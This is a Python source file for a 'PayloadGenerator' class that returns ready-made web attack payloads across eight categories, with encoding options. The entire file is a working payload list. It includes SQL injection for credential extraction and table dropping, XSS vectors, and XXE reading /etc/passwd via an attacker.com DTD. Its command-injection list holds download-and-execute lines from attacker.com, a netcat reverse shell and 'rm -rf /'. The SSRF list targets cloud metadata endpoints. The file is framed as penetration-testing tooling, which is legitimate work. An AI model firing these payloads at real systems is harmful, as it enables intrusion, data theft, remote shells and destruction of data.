"""
Payload Generator
Generates various security testing payloads (XSS, SQL Injection, etc.)
"""
from typing import List, Dict
import urllib.parse
import base64
import html


class PayloadGenerator:
    """Generate security testing payloads"""
    
    def __init__(self):
        self.payload_categories = {
            "xss": self._xss_payloads,
            "sql_injection": self._sql_injection_payloads,
            "command_injection": self._command_injection_payloads,
            "xxe": self._xxe_payloads,
            "ssrf": self._ssrf_payloads,
            "path_traversal": self._path_traversal_payloads,
            "ldap_injection": self._ldap_injection_payloads,
            "template_injection": self._template_injection_payloads,
        }
    
    def generate_payloads(self, category: str, encode: bool = False, encode_type: str = "url") -> List[Dict]:
        """
        Generate payloads for a specific category
        
        Args:
            category: Payload category (xss, sql_injection, etc.)
            encode: Whether to encode payloads
            encode_type: Encoding type (url, base64, html)
        
        Returns:
            List of payload dictionaries
        """
        if category not in self.payload_categories:
            raise ValueError(f"Category '{category}' not found. Available: {list(self.payload_categories.keys())}")
        
        payloads = self.payload_categories[category]()
        
        if encode:
            for payload in payloads:
                payload["encoded"] = self._encode_payload(payload["payload"], encode_type)
                payload["encoding"] = encode_type
        
        return payloads
    
    def _encode_payload(self, payload: str, encode_type: str) -> str:
        """Encode a payload"""
        if encode_type == "url":
            return urllib.parse.quote(payload)
        elif encode_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encode_type == "html":
            return html.escape(payload)
        elif encode_type == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        return payload
    
    def _xss_payloads(self) -> List[Dict]:
        """XSS payloads"""
        return [
            {"payload": "<script>alert('XSS')</script>", "description": "Basic XSS alert", "severity": "high"},
            {"payload": "<img src=x onerror=alert('XSS')>", "description": "Image tag XSS", "severity": "high"},
            {"payload": "<svg/onload=alert('XSS')>", "description": "SVG XSS", "severity": "high"},
            {"payload": "javascript:alert('XSS')", "description": "JavaScript protocol", "severity": "medium"},
            {"payload": "<iframe src=javascript:alert('XSS')>", "description": "Iframe XSS", "severity": "high"},
            {"payload": "<body onload=alert('XSS')>", "description": "Body onload XSS", "severity": "high"},
            {"payload": "<input onfocus=alert('XSS') autofocus>", "description": "Input autofocus XSS", "severity": "high"},
            {"payload": "<select onfocus=alert('XSS') autofocus>", "description": "Select autofocus XSS", "severity": "high"},
            {"payload": "<textarea onfocus=alert('XSS') autofocus>", "description": "Textarea autofocus XSS", "severity": "high"},
            {"payload": "<keygen onfocus=alert('XSS') autofocus>", "description": "Keygen autofocus XSS", "severity": "high"},
            {"payload": "<video><source onerror=alert('XSS')>", "description": "Video source XSS", "severity": "high"},
            {"payload": "<audio src=x onerror=alert('XSS')>", "description": "Audio XSS", "severity": "high"},
            {"payload": "<details open ontoggle=alert('XSS')>", "description": "Details toggle XSS", "severity": "medium"},
            {"payload": "'-alert('XSS')-'", "description": "String break XSS", "severity": "high"},
            {"payload": "\"><script>alert('XSS')</script>", "description": "Attribute break XSS", "severity": "high"},
            {"payload": "<marquee onstart=alert('XSS')>", "description": "Marquee XSS", "severity": "medium"},
            {"payload": "<div style=width:expression(alert('XSS'))>", "description": "CSS expression XSS", "severity": "medium"},
            {"payload": "<object data=javascript:alert('XSS')>", "description": "Object XSS", "severity": "high"},
            {"payload": "<embed src=javascript:alert('XSS')>", "description": "Embed XSS", "severity": "high"},
            {"payload": "<img src=x:alert('XSS') onerror=eval(src)>", "description": "Eval XSS", "severity": "critical"},
        ]
    
    def _sql_injection_payloads(self) -> List[Dict]:
        """SQL Injection payloads"""
        return [
            {"payload": "' OR '1'='1", "description": "Classic SQL injection", "severity": "critical"},
            {"payload": "' OR '1'='1' --", "description": "SQL injection with comment", "severity": "critical"},
            {"payload": "' OR '1'='1' /*", "description": "SQL injection with C-style comment", "severity": "critical"},
            {"payload": "admin' --", "description": "Admin bypass", "severity": "critical"},
            {"payload": "admin' #", "description": "Admin bypass with hash", "severity": "critical"},
            {"payload": "' UNION SELECT NULL--", "description": "UNION-based SQLi", "severity": "critical"},
            {"payload": "' UNION SELECT NULL, NULL--", "description": "UNION with 2 columns", "severity": "critical"},
            {"payload": "' UNION SELECT username, password FROM users--", "description": "UNION data extraction", "severity": "critical"},
            {"payload": "1' ORDER BY 1--", "description": "ORDER BY enumeration", "severity": "high"},
            {"payload": "1' ORDER BY 10--", "description": "ORDER BY column count", "severity": "high"},
            {"payload": "' AND 1=1--", "description": "Boolean-based blind SQLi (true)", "severity": "high"},
            {"payload": "' AND 1=2--", "description": "Boolean-based blind SQLi (false)", "severity": "high"},
            {"payload": "'; DROP TABLE users--", "description": "Destructive SQLi", "severity": "critical"},
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "description": "Time-based blind SQLi (MSSQL)", "severity": "high"},
            {"payload": "'; SELECT SLEEP(5)--", "description": "Time-based blind SQLi (MySQL)", "severity": "high"},
            {"payload": "' OR 1=1 LIMIT 1--", "description": "SQLi with LIMIT", "severity": "critical"},
            {"payload": "' OR 'x'='x", "description": "Alternative OR condition", "severity": "critical"},
            {"payload": "') OR ('1'='1", "description": "Parenthesis bypass", "severity": "critical"},
            {"payload": "' OR username LIKE '%admin%'--", "description": "LIKE-based SQLi", "severity": "high"},
            {"payload": "' UNION ALL SELECT NULL,NULL,NULL--", "description": "UNION ALL bypass", "severity": "critical"},
        ]
    
    def _command_injection_payloads(self) -> List[Dict]:
        """Command Injection payloads"""
        return [
            {"payload": "; ls", "description": "Basic command injection", "severity": "critical"},
            {"payload": "| ls", "description": "Pipe command injection", "severity": "critical"},
            {"payload": "& ls", "description": "Ampersand command injection", "severity": "critical"},
            {"payload": "&& ls", "description": "Double ampersand injection", "severity": "critical"},
            {"payload": "|| ls", "description": "OR command injection", "severity": "critical"},
            {"payload": "`ls`", "description": "Backtick command injection", "severity": "critical"},
            {"payload": "$(ls)", "description": "Dollar paren injection", "severity": "critical"},
            {"payload": "; cat /etc/passwd", "description": "Read passwd file", "severity": "critical"},
            {"payload": "; wget http://attacker.com/shell.sh", "description": "Download malicious file", "severity": "critical"},
            {"payload": "; curl http://attacker.com/shell.sh | sh", "description": "Download and execute", "severity": "critical"},
            {"payload": "; nc -e /bin/sh attacker.com 4444", "description": "Reverse shell", "severity": "critical"},
            {"payload": "; rm -rf /", "description": "Destructive command", "severity": "critical"},
            {"payload": "; python -c 'import socket,subprocess,os;...'", "description": "Python reverse shell", "severity": "critical"},
            {"payload": "; perl -e 'use Socket;...'", "description": "Perl reverse shell", "severity": "critical"},
            {"payload": "'; whoami; '", "description": "Command in quotes", "severity": "high"},
        ]
    
    def _xxe_payloads(self) -> List[Dict]:
        """XXE (XML External Entity) payloads"""
        return [
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                "description": "Basic XXE - read /etc/passwd",
                "severity": "critical"
            },
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                "description": "XXE - read Windows file",
                "severity": "critical"
            },
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
                "description": "XXE - remote DTD",
                "severity": "critical"
            },
            {
                "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>&xxe;</foo>',
                "description": "Blind XXE with out-of-band",
                "severity": "critical"
            },
        ]
    
    def _ssrf_payloads(self) -> List[Dict]:
        """SSRF (Server-Side Request Forgery) payloads"""
        return [
            {"payload": "http://localhost", "description": "SSRF to localhost", "severity": "high"},
            {"payload": "http://127.0.0.1", "description": "SSRF to 127.0.0.1", "severity": "high"},
            {"payload": "http://0.0.0.0", "description": "SSRF to 0.0.0.0", "severity": "high"},
            {"payload": "http://169.254.169.254/latest/meta-data/", "description": "AWS metadata SSRF", "severity": "critical"},
            {"payload": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata SSRF", "severity": "critical"},
            {"payload": "http://[::1]", "description": "IPv6 localhost SSRF", "severity": "high"},
            {"payload": "http://127.1", "description": "Short form localhost", "severity": "high"},
            {"payload": "http://2130706433", "description": "Decimal IP localhost", "severity": "high"},
            {"payload": "file:///etc/passwd", "description": "File protocol SSRF", "severity": "critical"},
            {"payload": "gopher://127.0.0.1:6379/_INFO", "description": "Gopher protocol SSRF", "severity": "high"},
        ]
    
    def _path_traversal_payloads(self) -> List[Dict]:
        """Path Traversal payloads"""
        return [
            {"payload": "../", "description": "Basic traversal", "severity": "high"},
            {"payload": "../../", "description": "Double traversal", "severity": "high"},
            {"payload": "../../../etc/passwd", "description": "Linux passwd traversal", "severity": "critical"},
            {"payload": "..\\..\\..\\windows\\win.ini", "description": "Windows traversal", "severity": "critical"},
            {"payload": "....//....//....//etc/passwd", "description": "Double encoding traversal", "severity": "high"},
            {"payload": "..%2F..%2F..%2Fetc%2Fpasswd", "description": "URL encoded traversal", "severity": "high"},
            {"payload": "..%252F..%252F..%252Fetc%252Fpasswd", "description": "Double URL encoded", "severity": "high"},
            {"payload": "/var/www/../../etc/passwd", "description": "Absolute path traversal", "severity": "critical"},
        ]
    
    def _ldap_injection_payloads(self) -> List[Dict]:
        """LDAP Injection payloads"""
        return [
            {"payload": "*", "description": "LDAP wildcard", "severity": "high"},
            {"payload": "admin*", "description": "LDAP admin wildcard", "severity": "high"},
            {"payload": ")(cn=*", "description": "LDAP filter bypass", "severity": "high"},
            {"payload": "*)(uid=*))(|(uid=*", "description": "LDAP OR injection", "severity": "high"},
        ]
    
    def _template_injection_payloads(self) -> List[Dict]:
        """Template Injection payloads"""
        return [
            {"payload": "{{7*7}}", "description": "Jinja2/Twig basic math", "severity": "high"},
            {"payload": "${7*7}", "description": "Freemarker/Velocity math", "severity": "high"},
            {"payload": "#{7*7}", "description": "Spring template math", "severity": "high"},
            {"payload": "{{config}}", "description": "Flask config exposure", "severity": "critical"},
            {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "description": "Python class exploration", "severity": "critical"},
            {"payload": "{{''.\\x5f\\x5fclass\\x5f\\x5f}}", "description": "Hex encoded class access", "severity": "high"},
        ]
    
    def list_categories(self) -> List[Dict]:
        """List all payload categories"""
        return [
            {"id": "xss", "name": "Cross-Site Scripting (XSS)", "count": len(self._xss_payloads())},
            {"id": "sql_injection", "name": "SQL Injection", "count": len(self._sql_injection_payloads())},
            {"id": "command_injection", "name": "Command Injection", "count": len(self._command_injection_payloads())},
            {"id": "xxe", "name": "XML External Entity (XXE)", "count": len(self._xxe_payloads())},
            {"id": "ssrf", "name": "Server-Side Request Forgery (SSRF)", "count": len(self._ssrf_payloads())},
            {"id": "path_traversal", "name": "Path Traversal", "count": len(self._path_traversal_payloads())},
            {"id": "ldap_injection", "name": "LDAP Injection", "count": len(self._ldap_injection_payloads())},
            {"id": "template_injection", "name": "Template Injection", "count": len(self._template_injection_payloads())},
        ]
